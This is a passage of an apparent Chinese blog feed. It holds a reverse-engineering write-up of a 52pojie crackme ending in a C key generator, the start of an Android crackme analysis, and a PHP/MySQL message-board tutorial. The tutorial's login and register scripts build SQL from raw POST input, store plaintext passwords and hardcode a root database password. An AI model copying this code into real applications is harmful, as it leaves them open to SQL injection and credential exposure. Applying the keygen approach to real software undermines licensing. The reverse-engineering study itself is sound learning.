0，字符串比较函数,比较v19[]与v50[]</span></span><br><span class="line">  <span class="built_in">LOBYTE</span>(v52) = <span class="number">28</span>;</span><br><span class="line">  v17 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v8 )                                     <span class="comment">// v8 == 0</span></span><br><span class="line">  &#123;</span><br><span class="line">      ...</span><br><span class="line">          <span class="keyword">return</span> = <span class="number">0</span>;<span class="comment">// 返回0是错的，可以不看</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    std::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::_Tidy(v17);</span><br><span class="line">    <span class="built_in">LOBYTE</span>(v52) = <span class="number">27</span>;</span><br><span class="line">    std::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::_Tidy(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">LOBYTE</span>(v52) = <span class="number">26</span>;</span><br><span class="line">    ...</span><br><span class="line"> std::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::_Tidy(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">LOBYTE</span>(v52) = <span class="number">0</span>;</span><br><span class="line">    std::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::_Tidy(<span class="number">1</span>);</span><br><span class="line">    v52 = <span class="number">-1</span>;</span><br><span class="line">    std::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::_Tidy(<span class="number">1</span>);</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于<code>sub_4011B0</code>里面的算法看伪代码太过复杂，想直观看到key变换成什么，可以用OllyDbg动态调试，直接看比较函数<code>sub_403ED0</code>出来的与原key比较。</p><h1 id="OD动态调试"><a href="#OD动态调试" class="headerlink" title="OD动态调试"></a>OD动态调试</h1><p>程序说的UID其实是吾爱论坛的UID，我看大牛们wp时百度了好久UID在哪里查看…</p><p>载入OD，输入自己的UID和随便的key，比如hhhhhhhhhhhh。输入完后去到<code>sub_401520</code>进去，再去到<code>sub_403ED0</code>下断运行至此处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00401CB2    E8 F9F4FFFF     call dumped_.004011B0</span><br><span class="line">00401CB7    83C4 1C         add esp,0x1C;403ED0参数从这里开始</span><br><span class="line">00401CBA    8D4C24 10       lea ecx,dword ptr ss:[esp+0x10]</span><br><span class="line">00401CBE    C68424 EC010000&gt;mov byte ptr ss:[esp+0x1EC],0x1D</span><br><span class="line">00401CC6    51              push ecx;第二个参数入栈v19[]=flag&#123;Happy_New_Year_52Pojie_2022&#125;的首地址</span><br><span class="line">00401CC7    8D8C24 D4010000 lea ecx,dword ptr ss:[esp+0x1D4];第一个参数的首地址在ecx中(v50[])</span><br><span class="line">00401CCE    E8 FD210000     call dumped_.00403ED0</span><br></pre></td></tr></table></figure><p>为了验证入栈的是否是v19，可查看堆栈窗口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0012FD44   0012FD58;首地址为0012FD58</span><br><span class="line">0012FD48   006B5B28</span><br><span class="line">0012FD4C   00000017</span><br><span class="line">0012FD50   0012FFC0</span><br><span class="line">0012FD54   FFFFFFFF</span><br><span class="line">0012FD58   003200FF;但这个并不是v19,再下一个地址才是</span><br><span class="line">0012FD5C   00392009  ASCII &quot;flag&#123;Happy_New_Year_52Pojie_2022&#125;&quot;</span><br></pre></td></tr></table></figure><p>再找ecx-&gt;数据窗口中跟随，同理，第二个地址存放的是比较的数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0012FF18  00 00 00 00 99 20 39 00 0C 00 00 00 1F 00 00 00  ....?9........</span><br></pre></td></tr></table></figure><p>继续数据窗口跟随，我们输入的“h”已经全变为“q”了。说明很有可能是单表替换中的移位密码，位数为9。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00392099  71 71 71 71 71 71 71 71 71 71 71 71 00 00 00 00  qqqqqqqqqqqq....</span><br></pre></td></tr></table></figure><p>再试多几次验证一下，发现不是移位密码！</p><p>happynewyear-&gt;qxiizktbztxg，只是普通的单表替换。</p><div class="table-container"><table><thead><tr><th>a</th><th>b</th><th>c</th><th>d</th><th>e</th><th>f</th><th>g</th><th>h</th><th>i</th><th>j</th><th>k</th><th>l</th><th>m</th><th>n</th><th>o</th><th>p</th><th>q</th><th>r</th><th>s</th><th>t</th></tr></thead><tbody><tr><td>x</td><td>w</td><td>v</td><td>u</td><td>t</td><td>s</td><td>r</td><td>q</td><td>p</td><td>o</td><td>n</td><td>m</td><td>l</td><td>k</td><td>j</td><td>i</td><td>h</td><td>g</td><td>f</td><td>e</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>u</th><th>v</th><th>w</th><th>x</th><th>y</th><th>z</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th><th>G</th><th>H</th><th>I</th><th>J</th><th>K</th><th>L</th><th>M</th><th>N</th></tr></thead><tbody><tr><td>d</td><td>c</td><td>b</td><td>a</td><td>z</td><td>y</td><td>X</td><td>W</td><td>V</td><td>U</td><td>T</td><td>S</td><td>R</td><td>Q</td><td>P</td><td>O</td><td>N</td><td>M</td><td>L</td><td>K</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>O</th><th>P</th><th>Q</th><th>R</th><th>S</th><th>T</th><th>U</th><th>V</th><th>W</th><th>X</th><th>Y</th><th>Z</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>{</th><th>_</th><th>…</th></tr></thead><tbody><tr><td>J</td><td>I</td><td>H</td><td>G</td><td>F</td><td>E</td><td>D</td><td>C</td><td>B</td><td>A</td><td>Z</td><td>Y</td><td>0</td><td>1</td><td>2</td><td>3</td><td>4</td><td>{</td><td>_</td><td>…</td></tr></tbody></table></div><p>所以<code>flag&#123;Happy_New_Year_52Pojie_2022&#125;</code>逆过来就是<code>smxr&#123;Qxiiz_Ktb_Ztxg_52Ijopt_2022&#125;</code></p><img src="/posts/5ada4708/%E6%88%90%E5%8A%9F%E6%88%AA%E5%9B%BE.png" class="" title="成功"><p>注意，这个只是在我UID为1787123的情况下的替换表，UID不同替换表也不同。我看wp说这其实是仿射密码，也就是替换表与静态分析<code>map[UID % 12]</code>，<code>UID % 25</code>其实是有关系的。</p><p>会的还是太少了，仿射密码的加解密原理自行百度，这里不想写了，最后附上大牛的注册机：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> <span class="type">const</span> flag[] = <span class="string">&quot;flag&#123;Happy_New_Year_52Pojie_2022&#125;&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="built_in">map</span>[] = &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">23</span>, <span class="number">25</span>&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> uid;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;uid) != EOF)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> A = <span class="built_in">map</span>[uid % <span class="number">12</span>];</span><br><span class="line">        <span class="type">int</span> B = uid % <span class="number">25</span>;</span><br><span class="line">        <span class="type">char</span> buf[<span class="keyword">sizeof</span>(flag)];</span><br><span class="line">        <span class="built_in">strcpy</span>(buf, flag);</span><br><span class="line">        <span class="type">char</span> *p = buf;</span><br><span class="line">        <span class="keyword">while</span> (*p)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&#x27;a&#x27;</span> &lt;= *p &amp;&amp; *p &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                *p = ((*p - <span class="string">&#x27;a&#x27;</span>) * A + B) % <span class="number">26</span> + <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&#x27;A&#x27;</span> &lt;= *p &amp;&amp; *p &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                *p = ((*p - <span class="string">&#x27;A&#x27;</span>) * A + B) % <span class="number">26</span> + <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ++p;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;拿到程序的第一时间运行一下，熟悉一下程序的流程。这个程序的流程是要我们输入UID和key。用PE工具查一下壳，发现有UPX壳，用ESP定律即可脱壳。验证程序是否脱壳成功，可载入OD看是否能查询到字符串，或载入IDA查看是否有函数或是否可以反编译出伪代码。脱壳后还要保证程序与未脱壳程序执行的流程要一致。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="OllyDbg" scheme="http://example.com/tags/OllyDbg/"/>
    
    <category term="IDA" scheme="http://example.com/tags/IDA/"/>
    
  </entry>
  
  <entry>
    <title>吾爱破解2022春节——Android中级题</title>
    <link href="http://example.com/posts/8b4ac9a8.html"/>
    <id>http://example.com/posts/8b4ac9a8.html</id>
    <published>2022-04-05T01:29:28.022Z</published>
    <updated>2022-04-11T05:25:42.851Z</updated>
    
    <content type="html"><![CDATA[<p>不会有人因为这道题所以去学了Android逆向吧？！！是的是我本人，为了能更好看懂Android程序还在寒假学了Java。所以这道题这么久才能跟你们见面。</p><span id="more"></span><p>在AK看到apk有lib文件，说明调用了so文件。是arm64-v8a架构的。完蛋了AS模拟器也运行不了arm64-v8a架构的。</p><img src="/posts/8b4ac9a8/1.png" class="" title="jeb简单分析"><p>先不管了，拖进IDA64看看情况。Native函数有两种定义方法，一种是按照类名函数名静态声明并导出，一种是在<code>JNI_OnLoad</code>里调用<code>vm -&gt; GetEnv -&gt; RegisterNatives</code>动态声明。看一眼它的导出表，发现并没有导出<code>checkSn</code>函数，那么就说明是<code>JNI_OnLoad</code>里动态注册的。</p><p>那…接下来就动态调试啦，要真机调试啊救命！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;不会有人因为这道题所以去学了Android逆向吧？！！是的是我本人，为了能更好看懂Android程序还在寒假学了Java。所以这道题这么久才能跟你们见面。&lt;/p&gt;</summary>
    
    
    
    <category term="Android逆向" scheme="http://example.com/categories/Android%E9%80%86%E5%90%91/"/>
    
    
    <category term="IDA" scheme="http://example.com/tags/IDA/"/>
    
    <category term="Android Killer" scheme="http://example.com/tags/Android-Killer/"/>
    
  </entry>
  
  <entry>
    <title>创建留言板</title>
    <link href="http://example.com/posts/b80b3bc2.html"/>
    <id>http://example.com/posts/b80b3bc2.html</id>
    <published>2022-04-05T01:29:28.002Z</published>
    <updated>2022-04-11T05:25:20.098Z</updated>
    
    <content type="html"><![CDATA[<p>//在Ubuntu环境下后端用MySQL，前端用HTML和PHP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su//进入根目录</span><br><span class="line">mysql -uroot -p123456//进入MySQL</span><br></pre></td></tr></table></figure><p>数据库和文件一定要在同一主机，并且将文件放在/var/www/html下，打开文件要走apache，即要在URL上输入路径，不能直接打开本地的html文件。</p><span id="more"></span><h1 id="1-创建数据库和基本表"><a href="#1-创建数据库和基本表" class="headerlink" title="1. 创建数据库和基本表"></a>1. 创建数据库和基本表</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">create database commentDB;</span><br><span class="line">use commentDB;</span><br><span class="line">create table user(</span><br><span class="line">    username char(20),</span><br><span class="line">    password char(20) not null,</span><br><span class="line">    email char(30),</span><br><span class="line">    primary key(username));</span><br><span class="line">create table u_c(</span><br><span class="line">    username char(20) not null,</span><br><span class="line">    comment varchar(100),</span><br><span class="line">    foreign key(username) references user(username));</span><br></pre></td></tr></table></figure><h1 id="2-设置注册界面"><a href="#2-设置注册界面" class="headerlink" title="2. 设置注册界面"></a>2. 设置注册界面</h1><p>register.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>用户注册<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;register.php&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--用post方法提交表单不会将用户输入的信息显示在URL上--&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--点击提交按钮后执行register.php--&gt;</span></span><br><span class="line">            用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">            密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">            邮箱：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;填写邮箱便于重置密码&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--type为password，用户输入不会显示实际字符，用黑圆点代替--&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--name是给这个输入起个名字，在php中要用到--&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--还想设置带*号是必填，用户名和密码是必填，但不会--&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;注册&quot;</span>&gt;</span>       </span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>register.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line"><span class="comment">//检测连接</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$conn</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败：&quot;</span>.<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>));</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="string">&quot;set names utf8&quot;</span>);<span class="comment">//设置编码，防止中文乱码</span></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];<span class="comment">//$_POST[]里面的参数即为html中的name</span></span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">&quot;email&quot;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into user&quot;</span>.<span class="string">&quot;(username, password, email)&quot;</span>.<span class="string">&quot;values&quot;</span>.<span class="string">&quot;(&#x27;<span class="subst">$username</span>&#x27;,&#x27;<span class="subst">$password</span>&#x27;,&#x27;<span class="subst">$email</span>&#x27;)&quot;</span>;<span class="comment">//编写插入语句</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$conn</span>,<span class="string">&#x27;commentDB&#x27;</span>);<span class="comment">//选择数据库</span></span><br><span class="line"><span class="variable">$retval</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);<span class="comment">//执行插入语句</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$retval</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;插入数据失败:&#x27;</span>.<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>));</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;username&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);<span class="comment">//关闭数据库连接</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:comment.html&quot;</span>);<span class="comment">//跳转至评论界面</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="3-设置登录界面"><a href="#3-设置登录界面" class="headerlink" title="3. 设置登录界面"></a>3. 设置登录界面</h1><p>login.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>用户登录<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;login.php&quot;</span>&gt;</span></span><br><span class="line">            用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">            密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登录&quot;</span>&gt;</span>       </span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;register.html&quot;</span>&gt;</span>注册<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>login.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$conn</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败：&quot;</span>.<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>));</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="comment">//判断用户密码是否为空</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span> == <span class="string">&quot;&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;请输入用户名！&quot;);&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$password</span> == <span class="string">&quot;&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;请输入密码！&quot;);&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//检测数据库中用户是否存在</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$conn</span>,<span class="string">&#x27;commentDB&#x27;</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username, password from user where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="comment">//登录成功跳转评论页面</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;username&quot;</span>, <span class="variable">$username</span>);<span class="comment">//将登录信息放入cookie</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:comment.html&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;用户名或密码错误！&quot;);&lt;/script&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="4-设置留言板界面"><a href="#4-设置留言板界面" class="headerlink" title="4. 设置留言板界面"></a>4. 设置留言板界面</h1><p>comment.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>留言板<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;comment.php&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>留言板<span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;comment&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;留言&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>comment.php</p><figure class="highlight php"><table><tr><td 